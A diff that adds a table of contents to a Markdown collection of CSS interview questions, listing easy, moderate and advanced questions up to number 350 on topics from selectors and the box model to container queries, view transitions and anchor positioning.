@@ -4,6 +4,460 @@ There are 450 questions here: 150 easy, 150 moderate and 150 advanced. They cove
 
 ## Table of Contents
 
+- [Easy Questions (1-150)](#easy-questions-1-150)
+  - [1: What is CSS?](#1-what-is-css)
+  - [2: What are the ways to add CSS to a page?](#2-what-are-the-ways-to-add-css-to-a-page)
+  - [3: What does a CSS rule look like?](#3-what-does-a-css-rule-look-like)
+  - [4: What is a selector?](#4-what-is-a-selector)
+  - [5: What is the difference between type, class and id selectors?](#5-what-is-the-difference-between-type-class-and-id-selectors)
+  - [6: What does the universal selector `*` do?](#6-what-does-the-universal-selector--do)
+  - [7: How do you apply the same styles to several selectors?](#7-how-do-you-apply-the-same-styles-to-several-selectors)
+  - [8: What is the difference between the descendant and child combinators?](#8-what-is-the-difference-between-the-descendant-and-child-combinators)
+  - [9: What is the difference between `+` and `~` combinators?](#9-what-is-the-difference-between--and--combinators)
+  - [10: What are attribute selectors?](#10-what-are-attribute-selectors)
+  - [11: What is a pseudo-class?](#11-what-is-a-pseudo-class)
+  - [12: What is a pseudo-element?](#12-what-is-a-pseudo-element)
+  - [13: What is the difference between `:` and `::`?](#13-what-is-the-difference-between--and-)
+  - [14: What does "cascading" mean in CSS?](#14-what-does-cascading-mean-in-css)
+  - [15: What is specificity?](#15-what-is-specificity)
+  - [16: How do you calculate specificity?](#16-how-do-you-calculate-specificity)
+  - [17: What does `!important` do and when should you use it?](#17-what-does-important-do-and-when-should-you-use-it)
+  - [18: What is inheritance in CSS?](#18-what-is-inheritance-in-css)
+  - [19: What do `inherit`, `initial`, `unset` and `revert` do?](#19-what-do-inherit-initial-unset-and-revert-do)
+  - [20: What is the CSS box model?](#20-what-is-the-css-box-model)
+  - [21: What is the difference between `content-box` and `border-box`?](#21-what-is-the-difference-between-content-box-and-border-box)
+  - [22: How do you make every element use `border-box`?](#22-how-do-you-make-every-element-use-border-box)
+  - [23: What is the difference between margin and padding?](#23-what-is-the-difference-between-margin-and-padding)
+  - [24: What is margin collapsing?](#24-what-is-margin-collapsing)
+  - [25: How do the margin and padding shorthands work with 1, 2, 3 or 4 values?](#25-how-do-the-margin-and-padding-shorthands-work-with-1-2-3-or-4-values)
+  - [26: What is the difference between `block`, `inline` and `inline-block`?](#26-what-is-the-difference-between-block-inline-and-inline-block)
+  - [27: What is the difference between `display: none`, `visibility: hidden` and `opacity: 0`?](#27-what-is-the-difference-between-display-none-visibility-hidden-and-opacity-0)
+  - [28: What is `position: static`?](#28-what-is-position-static)
+  - [29: What does `position: relative` do?](#29-what-does-position-relative-do)
+  - [30: What does `position: absolute` do?](#30-what-does-position-absolute-do)
+  - [31: What does `position: fixed` do?](#31-what-does-position-fixed-do)
+  - [32: What does `position: sticky` do?](#32-what-does-position-sticky-do)
+  - [33: What is `z-index`?](#33-what-is-z-index)
+  - [34: Why does `z-index` sometimes have no effect?](#34-why-does-z-index-sometimes-have-no-effect)
+  - [35: What do `float` and `clear` do?](#35-what-do-float-and-clear-do)
+  - [36: What is a clearfix?](#36-what-is-a-clearfix)
+  - [37: What are the values of `overflow`?](#37-what-are-the-values-of-overflow)
+  - [38: What is the difference between `px`, `em` and `rem`?](#38-what-is-the-difference-between-px-em-and-rem)
+  - [39: What is the `%` unit relative to?](#39-what-is-the--unit-relative-to)
+  - [40: What are `vw` and `vh`?](#40-what-are-vw-and-vh)
+  - [41: What are `svh`, `lvh` and `dvh`?](#41-what-are-svh-lvh-and-dvh)
+  - [42: What are the `ch` and `ex` units?](#42-what-are-the-ch-and-ex-units)
+  - [43: What color formats does CSS support?](#43-what-color-formats-does-css-support)
+  - [44: How do you add transparency to a color?](#44-how-do-you-add-transparency-to-a-color)
+  - [45: What is `currentColor`?](#45-what-is-currentcolor)
+  - [46: What is the difference between `opacity` and an alpha color?](#46-what-is-the-difference-between-opacity-and-an-alpha-color)
+  - [47: How does `font-family` work?](#47-how-does-font-family-work)
+  - [48: Which properties control font size, weight and style?](#48-which-properties-control-font-size-weight-and-style)
+  - [49: Why should `line-height` usually have no unit?](#49-why-should-line-height-usually-have-no-unit)
+  - [50: Which properties are used to style text?](#50-which-properties-are-used-to-style-text)
+  - [51: What do `letter-spacing` and `word-spacing` do?](#51-what-do-letter-spacing-and-word-spacing-do)
+  - [52: What does the `white-space` property do?](#52-what-does-the-white-space-property-do)
+  - [53: How do you cut off long text with "..."?](#53-how-do-you-cut-off-long-text-with-)
+  - [54: What is `@font-face`?](#54-what-is-font-face)
+  - [55: What is a system font stack?](#55-what-is-a-system-font-stack)
+  - [56: What are the main background properties?](#56-what-are-the-main-background-properties)
+  - [57: Can an element have more than one background?](#57-can-an-element-have-more-than-one-background)
+  - [58: What is the difference between `background-size: cover` and `contain`?](#58-what-is-the-difference-between-background-size-cover-and-contain)
+  - [59: How do you create a gradient?](#59-how-do-you-create-a-gradient)
+  - [60: How do `border` and `border-radius` work?](#60-how-do-border-and-border-radius-work)
+  - [61: How do you make a circle?](#61-how-do-you-make-a-circle)
+  - [62: What is the difference between `outline` and `border`?](#62-what-is-the-difference-between-outline-and-border)
+  - [63: How does `box-shadow` work?](#63-how-does-box-shadow-work)
+  - [64: How do you add a shadow to text?](#64-how-do-you-add-a-shadow-to-text)
+  - [65: What do `min-width`, `max-width`, `min-height` and `max-height` do?](#65-what-do-min-width-max-width-min-height-and-max-height-do)
+  - [66: What does `auto` mean for `width` and `margin`?](#66-what-does-auto-mean-for-width-and-margin)
+  - [67: How do you center a block element horizontally?](#67-how-do-you-center-a-block-element-horizontally)
+  - [68: How do you center text?](#68-how-do-you-center-text)
+  - [69: What is Flexbox?](#69-what-is-flexbox)
+  - [70: What are the main axis and the cross axis in Flexbox?](#70-what-are-the-main-axis-and-the-cross-axis-in-flexbox)
+  - [71: What does `flex-direction` do?](#71-what-does-flex-direction-do)
+  - [72: What does `justify-content` do?](#72-what-does-justify-content-do)
+  - [73: What does `align-items` do?](#73-what-does-align-items-do)
+  - [74: What does `flex-wrap` do?](#74-what-does-flex-wrap-do)
+  - [75: What does the `gap` property do?](#75-what-does-the-gap-property-do)
+  - [76: What does `flex: 1` mean?](#76-what-does-flex-1-mean)
+  - [77: What does the `order` property do?](#77-what-does-the-order-property-do)
+  - [78: What does `align-self` do?](#78-what-does-align-self-do)
+  - [79: How do you center an element both ways with Flexbox?](#79-how-do-you-center-an-element-both-ways-with-flexbox)
+  - [80: What is CSS Grid?](#80-what-is-css-grid)
+  - [81: What is the `fr` unit?](#81-what-is-the-fr-unit)
+  - [82: What does `repeat()` do in grid?](#82-what-does-repeat-do-in-grid)
+  - [83: How do you make a grid item span several columns or rows?](#83-how-do-you-make-a-grid-item-span-several-columns-or-rows)
+  - [84: What is `grid-template-areas`?](#84-what-is-grid-template-areas)
+  - [85: When should you use Flexbox and when should you use Grid?](#85-when-should-you-use-flexbox-and-when-should-you-use-grid)
+  - [86: What is the shortest way to center something with Grid?](#86-what-is-the-shortest-way-to-center-something-with-grid)
+  - [87: What are media queries?](#87-what-are-media-queries)
+  - [88: What is mobile-first CSS?](#88-what-is-mobile-first-css)
+  - [89: Why do you need the viewport meta tag?](#89-why-do-you-need-the-viewport-meta-tag)
+  - [90: How do you make images responsive with CSS?](#90-how-do-you-make-images-responsive-with-css)
+  - [91: What is a CSS transition?](#91-what-is-a-css-transition)
+  - [92: What are the parts of the `transition` shorthand?](#92-what-are-the-parts-of-the-transition-shorthand)
+  - [93: What does `transform` do?](#93-what-does-transform-do)
+  - [94: How do you create a CSS animation?](#94-how-do-you-create-a-css-animation)
+  - [95: What are the animation properties?](#95-what-are-the-animation-properties)
+  - [96: What is the difference between `:hover`, `:focus` and `:active`?](#96-what-is-the-difference-between-hover-focus-and-active)
+  - [97: What is `:focus-visible`?](#97-what-is-focus-visible)
+  - [98: How do `:first-child`, `:last-child` and `:nth-child()` work?](#98-how-do-first-child-last-child-and-nth-child-work)
+  - [99: What is the difference between `:nth-child()` and `:nth-of-type()`?](#99-what-is-the-difference-between-nth-child-and-nth-of-type)
+  - [100: What does `:not()` do?](#100-what-does-not-do)
+  - [101: How do `::before` and `::after` work?](#101-how-do-before-and-after-work)
+  - [102: What do `::placeholder` and `::selection` do?](#102-what-do-placeholder-and-selection-do)
+  - [103: What are `::first-letter` and `::first-line`?](#103-what-are-first-letter-and-first-line)
+  - [104: What are CSS custom properties?](#104-what-are-css-custom-properties)
+  - [105: How do you give `var()` a fallback value?](#105-how-do-you-give-var-a-fallback-value)
+  - [106: What does `calc()` do?](#106-what-does-calc-do)
+  - [107: What are `min()`, `max()` and `clamp()`?](#107-what-are-min-max-and-clamp)
+  - [108: How do you write comments in CSS?](#108-how-do-you-write-comments-in-css)
+  - [109: What is the difference between a CSS reset and Normalize.css?](#109-what-is-the-difference-between-a-css-reset-and-normalizecss)
+  - [110: What is the user agent stylesheet?](#110-what-is-the-user-agent-stylesheet)
+  - [111: How do you style lists?](#111-how-do-you-style-lists)
+  - [112: In what order should you write link states?](#112-in-what-order-should-you-write-link-states)
+  - [113: What does the `cursor` property do?](#113-what-does-the-cursor-property-do)
+  - [114: What does `object-fit` do?](#114-what-does-object-fit-do)
+  - [115: What does `aspect-ratio` do?](#115-what-does-aspect-ratio-do)
+  - [116: What does `vertical-align` do?](#116-what-does-vertical-align-do)
+  - [117: What does `pointer-events: none` do?](#117-what-does-pointer-events-none-do)
+  - [118: What does `display: inline-flex` do?](#118-what-does-display-inline-flex-do)
+  - [119: How do you style tables?](#119-how-do-you-style-tables)
+  - [120: Why does `opacity` on a parent affect its children?](#120-why-does-opacity-on-a-parent-affect-its-children)
+  - [121: What is a CSS preprocessor?](#121-what-is-a-css-preprocessor)
+  - [122: What are vendor prefixes?](#122-what-are-vendor-prefixes)
+  - [123: What is PostCSS?](#123-what-is-postcss)
+  - [124: What is a CSS framework?](#124-what-is-a-css-framework)
+  - [125: Why should you avoid `@import` in plain CSS?](#125-why-should-you-avoid-import-in-plain-css)
+  - [126: What is the difference between `<link>` and `@import`?](#126-what-is-the-difference-between-link-and-import)
+  - [127: What is a common mistake with shorthand properties?](#127-what-is-a-common-mistake-with-shorthand-properties)
+  - [128: What is the "62.5%" trick, and should you use it?](#128-what-is-the-625-trick-and-should-you-use-it)
+  - [129: What does the `inset` property do?](#129-what-does-the-inset-property-do)
+  - [130: What are logical properties?](#130-what-are-logical-properties)
+  - [131: How do you detect dark mode in CSS?](#131-how-do-you-detect-dark-mode-in-css)
+  - [132: What is `prefers-reduced-motion`?](#132-what-is-prefers-reduced-motion)
+  - [133: How do you write print styles?](#133-how-do-you-write-print-styles)
+  - [134: What is a CSS sprite?](#134-what-is-a-css-sprite)
+  - [135: What does the `resize` property do?](#135-what-does-the-resize-property-do)
+  - [136: What does `scroll-behavior: smooth` do?](#136-what-does-scroll-behavior-smooth-do)
+  - [137: What does `accent-color` do?](#137-what-does-accent-color-do)
+  - [138: Which pseudo-classes help style form states?](#138-which-pseudo-classes-help-style-form-states)
+  - [139: What is the difference between `:invalid` and `:user-invalid`?](#139-what-is-the-difference-between-invalid-and-user-invalid)
+  - [140: What is `::marker`?](#140-what-is-marker)
+  - [141: What does the `filter` property do?](#141-what-does-the-filter-property-do)
+  - [142: What does `backdrop-filter` do?](#142-what-does-backdrop-filter-do)
+  - [143: What is the difference between `overflow-wrap` and `word-break`?](#143-what-is-the-difference-between-overflow-wrap-and-word-break)
+  - [144: What does `text-wrap: balance` do?](#144-what-does-text-wrap-balance-do)
+  - [145: How do you limit text to a set number of lines?](#145-how-do-you-limit-text-to-a-set-number-of-lines)
+  - [146: Why doesn't `height: 100%` work?](#146-why-doesnt-height-100-work)
+  - [147: What does `display: contents` do?](#147-what-does-display-contents-do)
+  - [148: How do you debug CSS in the browser?](#148-how-do-you-debug-css-in-the-browser)
+  - [149: What happens when a browser sees CSS it doesn't understand?](#149-what-happens-when-a-browser-sees-css-it-doesnt-understand)
+  - [150: How do you check if a CSS feature is safe to use?](#150-how-do-you-check-if-a-css-feature-is-safe-to-use)
+- [Moderate Questions (151-300)](#moderate-questions-151-300)
+  - [151: How does specificity work for `:is()`, `:where()`, `:not()` and `:has()`?](#151-how-does-specificity-work-for-is-where-not-and-has)
+  - [152: When would you use `:where()` instead of `:is()`?](#152-when-would-you-use-where-instead-of-is)
+  - [153: What is `:has()` and what can you do with it?](#153-what-is-has-and-what-can-you-do-with-it)
+  - [154: How does native CSS nesting work?](#154-how-does-native-css-nesting-work)
+  - [155: How is native nesting different from Sass nesting?](#155-how-is-native-nesting-different-from-sass-nesting)
+  - [156: What are cascade layers (`@layer`)?](#156-what-are-cascade-layers-layer)
+  - [157: How do layer order and unlayered styles work?](#157-how-do-layer-order-and-unlayered-styles-work)
+  - [158: How does `!important` behave inside cascade layers?](#158-how-does-important-behave-inside-cascade-layers)
+  - [159: How do you put third-party CSS into a cascade layer?](#159-how-do-you-put-third-party-css-into-a-cascade-layer)
+  - [160: What is the full order of the cascade?](#160-what-is-the-full-order-of-the-cascade)
+  - [161: What is a stacking context, and what creates one?](#161-what-is-a-stacking-context-and-what-creates-one)
+  - [162: A dropdown shows up behind another section even with `z-index: 9999`. How do you fix it?](#162-a-dropdown-shows-up-behind-another-section-even-with-z-index-9999-how-do-you-fix-it)
+  - [163: What is a block formatting context (BFC)?](#163-what-is-a-block-formatting-context-bfc)
+  - [164: How do you create a block formatting context?](#164-how-do-you-create-a-block-formatting-context)
+  - [165: What is the containing block of an absolutely positioned element?](#165-what-is-the-containing-block-of-an-absolutely-positioned-element)
+  - [166: Why might `position: sticky` not work?](#166-why-might-position-sticky-not-work)
+  - [167: Why does a `position: fixed` modal scroll with the page?](#167-why-does-a-position-fixed-modal-scroll-with-the-page)
+  - [168: What is the difference between `flex-basis` and `width`?](#168-what-is-the-difference-between-flex-basis-and-width)
+  - [169: How do `flex-grow` and `flex-shrink` split the space?](#169-how-do-flex-grow-and-flex-shrink-split-the-space)
+  - [170: Why does a flex item overflow instead of shrinking?](#170-why-does-a-flex-item-overflow-instead-of-shrinking)
+  - [171: What is the difference between `align-items` and `align-content`?](#171-what-is-the-difference-between-align-items-and-align-content)
+  - [172: How does `margin: auto` work in a flex container?](#172-how-does-margin-auto-work-in-a-flex-container)
+  - [173: How do you make a sticky footer layout?](#173-how-do-you-make-a-sticky-footer-layout)
+  - [174: How do you build the "holy grail" layout?](#174-how-do-you-build-the-holy-grail-layout)
+  - [175: What is the difference between `auto-fill` and `auto-fit`?](#175-what-is-the-difference-between-auto-fill-and-auto-fit)
+  - [176: What is the implicit grid?](#176-what-is-the-implicit-grid)
+  - [177: What does `grid-auto-flow: dense` do?](#177-what-does-grid-auto-flow-dense-do)
+  - [178: How do named grid lines work?](#178-how-do-named-grid-lines-work)
+  - [179: What is subgrid?](#179-what-is-subgrid)
+  - [180: Why use `minmax(0, 1fr)` instead of `1fr`?](#180-why-use-minmax0-1fr-instead-of-1fr)
+  - [181: What is the difference between `justify-items` and `justify-content` in grid?](#181-what-is-the-difference-between-justify-items-and-justify-content-in-grid)
+  - [182: How do you stack items on top of each other with grid?](#182-how-do-you-stack-items-on-top-of-each-other-with-grid)
+  - [183: What are container queries?](#183-what-are-container-queries)
+  - [184: What do the `container-type` values mean?](#184-what-do-the-container-type-values-mean)
+  - [185: What are container query units?](#185-what-are-container-query-units)
+  - [186: How do you name a container and query a specific one?](#186-how-do-you-name-a-container-and-query-a-specific-one)
+  - [187: What are container style queries?](#187-what-are-container-style-queries)
+  - [188: What is the media query range syntax?](#188-what-is-the-media-query-range-syntax)
+  - [189: How do you make font sizes scale with the screen?](#189-how-do-you-make-font-sizes-scale-with-the-screen)
+  - [190: How do you serve different background images for different screen densities?](#190-how-do-you-serve-different-background-images-for-different-screen-densities)
+  - [191: How do you choose breakpoints?](#191-how-do-you-choose-breakpoints)
+  - [192: What are the `hover` and `pointer` media features?](#192-what-are-the-hover-and-pointer-media-features)
+  - [193: How do logical properties help with right-to-left languages?](#193-how-do-logical-properties-help-with-right-to-left-languages)
+  - [194: What is the `:dir()` pseudo-class?](#194-what-is-the-dir-pseudo-class)
+  - [195: What does `writing-mode` do?](#195-what-does-writing-mode-do)
+  - [196: How do custom properties work with the cascade and inheritance?](#196-how-do-custom-properties-work-with-the-cascade-and-inheritance)
+  - [197: What is the difference between custom properties and Sass variables?](#197-what-is-the-difference-between-custom-properties-and-sass-variables)
+  - [198: How do you read and set custom properties from JavaScript?](#198-how-do-you-read-and-set-custom-properties-from-javascript)
+  - [199: What is `@property`?](#199-what-is-property)
+  - [200: How do you animate a gradient?](#200-how-do-you-animate-a-gradient)
+  - [201: What does "invalid at computed-value time" mean?](#201-what-does-invalid-at-computed-value-time-mean)
+  - [202: How do you build a theme system with custom properties?](#202-how-do-you-build-a-theme-system-with-custom-properties)
+  - [203: What do `color-scheme` and `light-dark()` do?](#203-what-do-color-scheme-and-light-dark-do)
+  - [204: What does `color-mix()` do?](#204-what-does-color-mix-do)
+  - [205: What is relative color syntax?](#205-what-is-relative-color-syntax)
+  - [206: Why is OKLCH popular for colors?](#206-why-is-oklch-popular-for-colors)
+  - [207: How do you use wide-gamut colors?](#207-how-do-you-use-wide-gamut-colors)
+  - [208: How do you animate an element to and from `display: none`?](#208-how-do-you-animate-an-element-to-and-from-display-none)
+  - [209: How do you animate to `height: auto`?](#209-how-do-you-animate-to-height-auto)
+  - [210: What does `animation-fill-mode` do?](#210-what-does-animation-fill-mode-do)
+  - [211: How do you pause or reverse an animation with CSS?](#211-how-do-you-pause-or-reverse-an-animation-with-css)
+  - [212: What are `cubic-bezier()`, `steps()` and `linear()`?](#212-what-are-cubic-bezier-steps-and-linear)
+  - [213: Which properties are cheap to animate?](#213-which-properties-are-cheap-to-animate)
+  - [214: What are the individual transform properties?](#214-what-are-the-individual-transform-properties)
+  - [215: Why does the order of transform functions matter?](#215-why-does-the-order-of-transform-functions-matter)
+  - [216: How do 3D transforms work?](#216-how-do-3d-transforms-work)
+  - [217: What is `will-change` and when should you use it?](#217-what-is-will-change-and-when-should-you-use-it)
+  - [218: How does scroll snapping work?](#218-how-does-scroll-snapping-work)
+  - [219: What does `overscroll-behavior` do?](#219-what-does-overscroll-behavior-do)
+  - [220: How do you stop a fixed header from covering anchor targets?](#220-how-do-you-stop-a-fixed-header-from-covering-anchor-targets)
+  - [221: How do you style scrollbars?](#221-how-do-you-style-scrollbars)
+  - [222: How do you make a table header stick when you scroll?](#222-how-do-you-make-a-table-header-stick-when-you-scroll)
+  - [223: How do you hide something visually but keep it for screen readers?](#223-how-do-you-hide-something-visually-but-keep-it-for-screen-readers)
+  - [224: How do you write good focus styles?](#224-how-do-you-write-good-focus-styles)
+  - [225: What is forced colors mode?](#225-what-is-forced-colors-mode)
+  - [226: How do you handle `prefers-reduced-motion` properly?](#226-how-do-you-handle-prefers-reduced-motion-properly)
+  - [227: Is content from `::before` and `::after` read by screen readers?](#227-is-content-from-before-and-after-read-by-screen-readers)
+  - [228: What is BEM?](#228-what-is-bem)
+  - [229: What are OOCSS, SMACSS and ITCSS?](#229-what-are-oocss-smacss-and-itcss)
+  - [230: What is utility-first CSS?](#230-what-is-utility-first-css)
+  - [231: What are CSS Modules?](#231-what-are-css-modules)
+  - [232: What are the pros and cons of CSS-in-JS?](#232-what-are-the-pros-and-cons-of-css-in-js)
+  - [233: How does Shadow DOM isolate styles?](#233-how-does-shadow-dom-isolate-styles)
+  - [234: What do `:host`, `::slotted()` and `::part()` do?](#234-what-do-host-slotted-and-part-do)
+  - [235: What is `@scope`?](#235-what-is-scope)
+  - [236: Which Sass features do teams use most?](#236-which-sass-features-do-teams-use-most)
+  - [237: What is the difference between `@use` and `@import` in Sass?](#237-what-is-the-difference-between-use-and-import-in-sass)
+  - [238: What do PostCSS and Lightning CSS do in a build?](#238-what-do-postcss-and-lightning-css-do-in-a-build)
+  - [239: What is `@supports`?](#239-what-is-supports)
+  - [240: What is progressive enhancement in CSS?](#240-what-is-progressive-enhancement-in-css)
+  - [241: What does `font-display` do?](#241-what-does-font-display-do)
+  - [242: What are FOUT and FOIT, and how do you reduce them?](#242-what-are-fout-and-foit-and-how-do-you-reduce-them)
+  - [243: What are variable fonts?](#243-what-are-variable-fonts)
+  - [244: How do you stop layout shift when a web font loads?](#244-how-do-you-stop-layout-shift-when-a-web-font-loads)
+  - [245: How do you crop an image to a shape?](#245-how-do-you-crop-an-image-to-a-shape)
+  - [246: What does `mask-image` do?](#246-what-does-mask-image-do)
+  - [247: What does `shape-outside` do?](#247-what-does-shape-outside-do)
+  - [248: What is the difference between `filter: drop-shadow()` and `box-shadow`?](#248-what-is-the-difference-between-filter-drop-shadow-and-box-shadow)
+  - [249: What do blend modes do?](#249-what-do-blend-modes-do)
+  - [250: What does `isolation: isolate` do?](#250-what-does-isolation-isolate-do)
+  - [251: How do CSS counters work?](#251-how-do-css-counters-work)
+  - [252: What does `attr()` do in `content`?](#252-what-does-attr-do-in-content)
+  - [253: How do you style form controls that look different in every browser?](#253-how-do-you-style-form-controls-that-look-different-in-every-browser)
+  - [254: How do you build a custom checkbox with CSS?](#254-how-do-you-build-a-custom-checkbox-with-css)
+  - [255: What does `field-sizing: content` do?](#255-what-does-field-sizing-content-do)
+  - [256: What does `:focus-within` do?](#256-what-does-focus-within-do)
+  - [257: How do you build a floating label with CSS only?](#257-how-do-you-build-a-floating-label-with-css-only)
+  - [258: What do `:empty` and `:target` do?](#258-what-do-empty-and-target-do)
+  - [259: What does `:nth-child(An+B of S)` do?](#259-what-does-nth-childanb-of-s-do)
+  - [260: What is `::backdrop`?](#260-what-is-backdrop)
+  - [261: How do you style popovers?](#261-how-do-you-style-popovers)
+  - [262: How do you style a `<dialog>`?](#262-how-do-you-style-a-dialog)
+  - [263: How do you style `<details>` and `<summary>`?](#263-how-do-you-style-details-and-summary)
+  - [264: What does `table-layout: fixed` do?](#264-what-does-table-layout-fixed-do)
+  - [265: How do you make text truncate inside a flex child?](#265-how-do-you-make-text-truncate-inside-a-flex-child)
+  - [266: How does multi-column layout work?](#266-how-does-multi-column-layout-work)
+  - [267: Why is there a gap between `inline-block` elements?](#267-why-is-there-a-gap-between-inline-block-elements)
+  - [268: Why is there a small gap under an image?](#268-why-is-there-a-small-gap-under-an-image)
+  - [269: Do margins collapse inside flex and grid containers?](#269-do-margins-collapse-inside-flex-and-grid-containers)
+  - [270: What can you do with negative margins?](#270-what-can-you-do-with-negative-margins)
+  - [271: Why is percentage padding based on width?](#271-why-is-percentage-padding-based-on-width)
+  - [272: What do `min-content`, `max-content` and `fit-content` mean?](#272-what-do-min-content-max-content-and-fit-content-mean)
+  - [273: What is the difference between `overflow: hidden` and `overflow: clip`?](#273-what-is-the-difference-between-overflow-hidden-and-overflow-clip)
+  - [274: What is the difference between `overflow-wrap: anywhere` and `break-word`?](#274-what-is-the-difference-between-overflow-wrap-anywhere-and-break-word)
+  - [275: How do you style SVG icons with CSS?](#275-how-do-you-style-svg-icons-with-css)
+  - [276: How do you add a dark mode toggle that respects the OS setting?](#276-how-do-you-add-a-dark-mode-toggle-that-respects-the-os-setting)
+  - [277: What is `prefers-contrast`?](#277-what-is-prefers-contrast)
+  - [278: How do you control page breaks when printing?](#278-how-do-you-control-page-breaks-when-printing)
+  - [279: How do you avoid specificity wars?](#279-how-do-you-avoid-specificity-wars)
+  - [280: What does `all: unset` do, and how is it different from `all: revert`?](#280-what-does-all-unset-do-and-how-is-it-different-from-all-revert)
+  - [281: What does `revert-layer` do?](#281-what-does-revert-layer-do)
+  - [282: How do you find out why a style isn't applied?](#282-how-do-you-find-out-why-a-style-isnt-applied)
+  - [283: How do you debug layout problems?](#283-how-do-you-debug-layout-problems)
+  - [284: How do you chain fallbacks for custom properties?](#284-how-do-you-chain-fallbacks-for-custom-properties)
+  - [285: What goes into a modern CSS reset?](#285-what-goes-into-a-modern-css-reset)
+  - [286: How do you manage `z-index` values in a big project?](#286-how-do-you-manage-z-index-values-in-a-big-project)
+  - [287: How do you center an absolutely positioned element?](#287-how-do-you-center-an-absolutely-positioned-element)
+  - [288: How do you make a responsive video embed?](#288-how-do-you-make-a-responsive-video-embed)
+  - [289: What is `env()` and the safe area?](#289-what-is-env-and-the-safe-area)
+  - [290: What does `touch-action` do?](#290-what-does-touch-action-do)
+  - [291: What does `user-select` do?](#291-what-does-user-select-do)
+  - [292: What is the difference between `:root` and `html`?](#292-what-is-the-difference-between-root-and-html)
+  - [293: When should you use a container query and when a media query?](#293-when-should-you-use-a-container-query-and-when-a-media-query)
+  - [294: How do you make a responsive grid of cards without media queries?](#294-how-do-you-make-a-responsive-grid-of-cards-without-media-queries)
+  - [295: How do you build a full-bleed section inside a centered layout?](#295-how-do-you-build-a-full-bleed-section-inside-a-centered-layout)
+  - [296: How do you write a "stack" layout that adds space between children?](#296-how-do-you-write-a-stack-layout-that-adds-space-between-children)
+  - [297: How do you make equal-height columns?](#297-how-do-you-make-equal-height-columns)
+  - [298: How do you add a skip link?](#298-how-do-you-add-a-skip-link)
+  - [299: How do you style based on the number of children?](#299-how-do-you-style-based-on-the-number-of-children)
+  - [300: What do `text-underline-offset` and `text-decoration-thickness` do?](#300-what-do-text-underline-offset-and-text-decoration-thickness-do)
+- [Advanced Questions (301-450)](#advanced-questions-301-450)
+  - [301: Why is CSS render-blocking?](#301-why-is-css-render-blocking)
+  - [302: What is the CSSOM?](#302-what-is-the-cssom)
+  - [303: Why do browsers match selectors from right to left?](#303-why-do-browsers-match-selectors-from-right-to-left)
+  - [304: Does selector performance matter in practice?](#304-does-selector-performance-matter-in-practice)
+  - [305: What are the steps of the rendering pipeline?](#305-what-are-the-steps-of-the-rendering-pipeline)
+  - [306: What is layout thrashing?](#306-what-is-layout-thrashing)
+  - [307: Which property changes trigger layout, paint or only composite?](#307-which-property-changes-trigger-layout-paint-or-only-composite)
+  - [308: What are compositor layers and what does promoting an element cost?](#308-what-are-compositor-layers-and-what-does-promoting-an-element-cost)
+  - [309: What does the `contain` property do?](#309-what-does-the-contain-property-do)
+  - [310: What does `content-visibility: auto` do?](#310-what-does-content-visibility-auto-do)
+  - [311: What is critical CSS?](#311-what-is-critical-css)
+  - [312: How does the `media="print" onload` trick work?](#312-how-does-the-mediaprint-onload-trick-work)
+  - [313: How do you find and remove unused CSS?](#313-how-do-you-find-and-remove-unused-css)
+  - [314: How can CSS cause layout shift (CLS)?](#314-how-can-css-cause-layout-shift-cls)
+  - [315: How can CSS slow down LCP?](#315-how-can-css-slow-down-lcp)
+  - [316: How do you load fonts as fast as possible?](#316-how-do-you-load-fonts-as-fast-as-possible)
+  - [317: Can `:has()` hurt performance?](#317-can-has-hurt-performance)
+  - [318: Why do some CSS animations jank even when they use `transform`?](#318-why-do-some-css-animations-jank-even-when-they-use-transform)
+  - [319: What are scroll-driven animations?](#319-what-are-scroll-driven-animations)
+  - [320: How do view timelines and animation ranges work?](#320-how-do-view-timelines-and-animation-ranges-work)
+  - [321: What is the View Transitions API?](#321-what-is-the-view-transitions-api)
+  - [322: How does `view-transition-name` work, and what does the pseudo-element tree look like?](#322-how-does-view-transition-name-work-and-what-does-the-pseudo-element-tree-look-like)
+  - [323: How do cross-document view transitions work?](#323-how-do-cross-document-view-transitions-work)
+  - [324: What are view transition types?](#324-what-are-view-transition-types)
+  - [325: What is CSS anchor positioning?](#325-what-is-css-anchor-positioning)
+  - [326: How do anchor positioning fallbacks work?](#326-how-do-anchor-positioning-fallbacks-work)
+  - [327: What do `position-area` and `anchor-size()` do?](#327-what-do-position-area-and-anchor-size-do)
+  - [328: How do you build a tooltip with popover and anchor positioning, without JavaScript?](#328-how-do-you-build-a-tooltip-with-popover-and-anchor-positioning-without-javascript)
+  - [329: What is the customizable `<select>`?](#329-what-is-the-customizable-select)
+  - [330: What is the CSS `if()` function?](#330-what-is-the-css-if-function)
+  - [331: What are `sibling-index()` and `sibling-count()`?](#331-what-are-sibling-index-and-sibling-count)
+  - [332: What is the typed `attr()` function?](#332-what-is-the-typed-attr-function)
+  - [333: What are CSS custom functions (`@function`)?](#333-what-are-css-custom-functions-function)
+  - [334: What do `calc-size()` and `interpolate-size` do?](#334-what-do-calc-size-and-interpolate-size-do)
+  - [335: What math functions does CSS have besides `calc()`?](#335-what-math-functions-does-css-have-besides-calc)
+  - [336: When should a registered custom property use `inherits: false`?](#336-when-should-a-registered-custom-property-use-inherits-false)
+  - [337: What happens with circular custom property references?](#337-what-happens-with-circular-custom-property-references)
+  - [338: How would you design a cascade layer setup for a large app?](#338-how-would-you-design-a-cascade-layer-setup-for-a-large-app)
+  - [339: How does scoping proximity work in `@scope`?](#339-how-does-scoping-proximity-work-in-scope)
+  - [340: What is a "donut scope" and when do you need it?](#340-what-is-a-donut-scope-and-when-do-you-need-it)
+  - [341: How do styles cross the Shadow DOM boundary?](#341-how-do-styles-cross-the-shadow-dom-boundary)
+  - [342: What are constructable stylesheets?](#342-what-are-constructable-stylesheets)
+  - [343: What is CSS Houdini?](#343-what-is-css-houdini)
+  - [344: Why is `getComputedStyle` sometimes slow?](#344-why-is-getcomputedstyle-sometimes-slow)
+  - [345: Why do runtime CSS-in-JS libraries hurt performance?](#345-why-do-runtime-css-in-js-libraries-hurt-performance)
+  - [346: How do zero-runtime CSS-in-JS libraries work?](#346-how-do-zero-runtime-css-in-js-libraries-work)
+  - [347: What are the trade-offs of atomic CSS?](#347-what-are-the-trade-offs-of-atomic-css)
+  - [348: How would you structure design tokens in CSS?](#348-how-would-you-structure-design-tokens-in-css)
+  - [349: How would you support several brands in one codebase?](#349-how-would-you-support-several-brands-in-one-codebase)
+  - [350: How do you prevent a flash of the wrong theme with server rendering?](#350-how-do-you-prevent-a-flash-of-the-wrong-theme-with-server-rendering)
